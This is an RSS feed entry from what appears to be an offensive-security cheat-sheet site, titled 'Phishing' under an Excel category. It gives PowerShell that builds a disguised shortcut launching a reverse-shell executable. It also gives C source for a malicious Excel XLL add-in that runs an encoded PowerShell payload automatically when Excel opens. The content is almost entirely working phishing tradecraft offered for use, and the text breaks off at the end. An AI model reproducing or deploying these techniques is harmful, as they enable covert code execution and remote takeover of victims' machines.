channel.title: Excel on TLDRBins
channel.description: Recent content in Excel on TLDRBins

item.title: Phishing
item.description: Abuse #1: Create a malicious .lnk $obj = New-Object -ComObject WScript.Shell $link = $obj.CreateShortcut("C:\ProgramData\Calculator.lnk") $link.TargetPath = "C:\ProgramData\rev.exe" $link.Save() Abuse #2: Phishing with XLL (Excel) revshells.com shell.c #include <windows.h> __declspec(dllexport) void __cdecl xlAutoOpen(void); void __cdecl xlAutoOpen() { // Triggers when Excel opens WinExec("<PowerShell #3 Base64 Payload>", 1); // Replace your payload } BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } 1.
